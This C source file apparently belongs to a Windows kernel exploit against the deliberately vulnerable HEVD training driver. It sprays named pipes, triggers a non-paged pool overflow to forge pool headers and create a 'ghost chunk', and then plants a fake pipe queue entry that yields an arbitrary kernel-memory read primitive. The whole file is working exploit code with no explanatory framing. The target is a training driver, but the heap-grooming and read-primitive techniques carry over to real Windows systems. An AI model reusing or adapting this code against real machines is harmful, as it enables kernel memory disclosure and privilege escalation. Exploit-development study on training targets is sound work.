#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <cstdint>

#include "primitives/arbitrary_read.h"

#include "pipe_utils/pipe_utils.h"
#include "hevd/hevd.h"

pipe_queue_entry_sub_t g_fake_pipe_queue_sub;

int scanPipesForLeak(pipe_spray_t* pipe_spray, char* leak)
{
    char buf[0x1000] = { 0 };

    for (size_t i = 0; i < pipe_spray->nb; i++)
    {
        size_t read_size = LEN_OF_PIPE_QUEUE_ENTRY_STRUCT + POOL_HEADER_SIZE;

        if (!PeekDataFromPipe(&pipe_spray->pipes[i], buf, read_size))
        {
            fprintf(stderr, "[-] Failed to peek pipe\n");
            exit(0);
        }

        if (memcmp((char*)pipe_spray->data_buf, buf, read_size))
        {
            printf("[+] Detected pipe with overwritten buffer\n");

            printf("\toriginal:    ");
            for (int j = 0; j < read_size; j++)
            {
                printf("%02x ", pipe_spray->data_buf[j] & 0xff);
            }
            puts("");
            printf("\toverwritten: ");
            for (int j = 0; j < read_size; j++)
            {
                printf("%02x ", buf[j] & 0xff);
            }
            puts("");

            memcpy(leak, buf, read_size);
            return i;
        }
    }
    return -1;
}

lookaside_t* prepareLookaside(size_t size)
{
    lookaside_t* lookaside = (lookaside_t*)malloc(sizeof(lookaside_t));

    lookaside->size = size;
    lookaside->buf = (char*)malloc(lookaside->size);

    memset(lookaside->buf, 0x40, lookaside->size);
    strcpy_s(lookaside->buf, ATTRIBUTE_NAME_LEN, ATTRIBUTE_NAME);

    lookaside->first = CreatePipeSpray(0x10000, lookaside->size, lookaside->buf);
    lookaside->second = CreatePipeSpray(0x10000, lookaside->size, lookaside->buf);
    lookaside->drain = CreatePipeSpray(0x100, lookaside->size, lookaside->buf);

    return lookaside;
}

int createGhostChunk(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
{
    char dummy_attribute[0x1000];
    memset(dummy_attribute, 0x41, 0x1000);

    puts("[*] Spraying pipes to allocate new VS_SUB_SEGMENT...");
    pipe_spray_t* drain_spray = CreatePipeSpray(0x20000, TARGETED_VULN_SIZE, dummy_attribute);
    PerformPipeSpray(drain_spray);

    puts("[*] Spraying pipes to create chunk holes...");
    pipe_spray_t* create_holes_spray = CreatePipeSpray(SPRAY_SIZE, TARGETED_VULN_SIZE + 0x10, dummy_attribute);
    PerformPipeSpray(create_holes_spray);

    Sleep(500);

    // Create holes
    FreeEveryThirdPipe(create_holes_spray, 0);

    // Trigger vulnerability to manipulate adjacent chunk's pool header
    vs_chunk_t overflow_chunk = { 0 };
    overflow_chunk.previous_size = BACKWARD_STEP / 0x10;
    overflow_chunk.pool_index = 0;
    overflow_chunk.block_size = 0;
    overflow_chunk.pool_type = 0 | 4;                // set aligned chunk flag

    HANDLE hHevd = HevdOpenDeviceHandle();
    HevdTriggerBufferOverflowNonPagedPoolNx(hHevd, (char*)&overflow_chunk);
    CloseHandle(hHevd);

    Sleep(2000);

    vs_chunk_t fake_pool_header_chunk = { 0 };
    fake_pool_header_chunk.previous_size = 0;
    fake_pool_header_chunk.pool_index = 0;
    fake_pool_header_chunk.block_size = (GHOST_CHUNK_SIZE + POOL_HEADER_SIZE) / 0x10;
    fake_pool_header_chunk.pool_tag = 0x4141414141;

    puts("[*] Spraying pipes with fake POOL_HEADER...");
    pipes->fake_pool_header = CreatePipeSpray(SPRAY_SIZE, TARGETED_VULN_SIZE, (char*)&fake_pool_header_chunk);
    PerformPipeSpray(pipes->fake_pool_header);

    lookaside_t* ghost_lookaside = prepareLookaside(GHOST_CHUNK_SIZE + 0x10);
    lookaside_t* vuln_lookaside = prepareLookaside(TARGETED_VULN_SIZE + 0x10);
    EnableLookaside(2, ghost_lookaside, vuln_lookaside);

    puts("[+] Locating overwritten chunk...");
    memset(dummy_attribute, 0x43, 0x1000);
    strcpy_s(dummy_attribute, ATTRIBUTE_NAME_LEN, ATTRIBUTE_NAME);
    size_t leaking_pipe_idx;
    pipe_spray_t* ghosts = CreatePipeSpray(SPRAY_SIZE, GHOST_CHUNK_SIZE + 0x10, dummy_attribute);

    for (int ghost_idx = 0; ghost_idx < create_holes_spray->nb; ghost_idx++)
    {
        // Free an existing pipe queue entry to create space for the ghost chunk
        FreeNPPNxChunk(&create_holes_spray->pipes[ghost_idx], create_holes_spray->bufsize);
        // Allocate a chunk of ghost chunk size and attempt to secure the created ghost chunk
        AllocNPPNxChunk(&ghosts->pipes[ghost_idx], (vs_chunk_t*)dummy_attribute, GHOST_CHUNK_BUFSIZE);

        // Check if ghost chunk creation and allocation was successful
        char leak[0x1000];
        leaking_pipe_idx = scanPipesForLeak(pipes->fake_pool_header, leak);
        if (leaking_pipe_idx == -1)
        {
            // If ghost chunk creation failed, clear the lookaside list head and retry
            AllocNPPNxChunk(&create_holes_spray->pipes[ghost_idx], (vs_chunk_t*)create_holes_spray->data_buf, create_holes_spray->bufsize);
            continue;
        }
        else
        {
            printf("[+] Data leak detected in pipe %d (fake_pool_header)\n", leaking_pipe_idx);

            addrs->leak_root_queue = *(uintptr_t*)((char*)leak + GHOST_CHUNK_OFFSET + POOL_HEADER_SIZE);
            printf("[+] leak_root_queue: 0x%llX\n", addrs->leak_root_queue);

            pipes->ghost_pipe = &ghosts->pipes[ghost_idx];
            printf("[+] ghost_pipe: 0x%llX\n", pipes->ghost_pipe);

            pipes->previous_pipe = &pipes->fake_pool_header->pipes[leaking_pipe_idx];
            printf("[+] previous_pipe: 0x%llX\n", pipes->previous_pipe);
            break;
        }
    }

    if (leaking_pipe_idx == -1)
    {
        fprintf(stderr, "[-] Failed to detect data leak in pipes\n");
        return 0;
    }

    return 1;
}

int SetupArbitraryRead(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
{
    if (!createGhostChunk(pipes, addrs))
    {
        fprintf(stderr, "[-] Failed to create ghost chunk\n");
        return 0;
    }

    vs_chunk_t fake_pipe_queue_entry_chunk = { 0 };
    fake_pipe_queue_entry_chunk.pipe_queue_entry.list.Flink = (LIST_ENTRY*)addrs->leak_root_queue;
    fake_pipe_queue_entry_chunk.pipe_queue_entry.list.Blink = (LIST_ENTRY*)addrs->leak_root_queue;
    fake_pipe_queue_entry_chunk.pipe_queue_entry.linkedIRP = (uintptr_t)&g_fake_pipe_queue_sub;
    fake_pipe_queue_entry_chunk.pipe_queue_entry.SecurityClientContext = 0;
    fake_pipe_queue_entry_chunk.pipe_queue_entry.isDataInKernel = 0x1;
    fake_pipe_queue_entry_chunk.pipe_queue_entry.DataSize = 0xffffffff;
    fake_pipe_queue_entry_chunk.pipe_queue_entry.remaining_bytes = 0xffffffff;
    fake_pipe_queue_entry_chunk.pipe_queue_entry.field_2C = 0x43434343;

    puts("[*] Spraying pipes with fake pipe queue entry...");
    uintptr_t pipe_queue_entry_addr;
    do
    {
        FreeNPPNxChunk(pipes->previous_pipe, TARGETED_VULN_SIZE - 0x40);
        AllocNPPNxChunk(pipes->previous_pipe, &fake_pipe_queue_entry_chunk, TARGETED_VULN_SIZE - 0x40);
        ArbitraryRead(pipes->ghost_pipe, addrs->leak_root_queue, (char*)&pipe_queue_entry_addr, 0x8);
    } while (pipe_queue_entry_addr == 0x434343434343005A);

    return 1;
}

void ArbitraryRead(pipe_pair_t* ghost_pipe, uintptr_t where, char* out, size_t size)
{
    char arb_read[0x1000];

    if (size >= 0x1000)
        size = 0xFFF;

    g_fake_pipe_queue_sub.data_ptr = where;
    PeekDataFromPipe(ghost_pipe, arb_read, size);
    memcpy(out, arb_read, size);
}